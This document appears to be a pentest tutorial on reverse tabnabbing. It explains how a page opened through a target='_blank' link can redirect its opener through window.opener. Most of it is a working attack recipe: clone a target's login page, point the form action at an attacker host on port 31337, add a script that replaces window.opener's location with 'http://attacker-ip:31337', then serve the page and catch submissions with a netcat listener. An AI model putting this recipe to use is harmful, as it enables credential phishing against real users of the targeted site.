- - -
People using **target=’_blank’** links usually have no idea about this curious fact:
The page we’re linking to gains partial access to the source page via the **window.opener** object.
The newly opened tab can then change the window.opener.location to some phishing page.
- - -

![Imgur](https://i.imgur.com/c3vMTw2h.png)

- - -
## Exploitation Steps : 

```sh
cd /var/www/html
```

```sh
touch offsec.html
```

Now create a html file but.....
				🌱️ Replace the `<body>` and `<head>` of the from the target web.
				🌱️ Modify the <action="<http://Our-IP:31337/".
				🌱️ Modify script's attacker-IP to your IP.

```sh
nano offsec.html
```

```html
<html>  
<head> 

<!-- paste the target login page head------------- -->

</head>  
<body>  
  
  <!--
 paste the target login page body , just try to  mimic the target login page!!}}}}
-->

<!--
{{{{#NOTE : You should change <action='http://Our-IP:31337/' > for better results }}}}
-->

<script>  
				if(window.opener) window.opener.parent.location.replace('http://attacker-ip:31337')  
				if(window.opener != window) window.opener.parent.location.replace('http://attacker-ip:31337')  
</script>  
  
  
</body>  
</html>
```

**Now On a new terminal** : 
```sh
service apache2 start
```

```sh
tail -f -n 10 /var/log/apache2/access.log
```
##### Or 
```sh
python3 -m http.server 80
```


**Then, On a new terminal again** : 
```sh
nc -nlvp 31337
```

- **now move to Browser** **:**
- **And provoke the target web** :

![Imgur](https://i.imgur.com/uBTDYtIh.png)

And Now The pentesters with their FEET-UP!! 🦶🦶🦶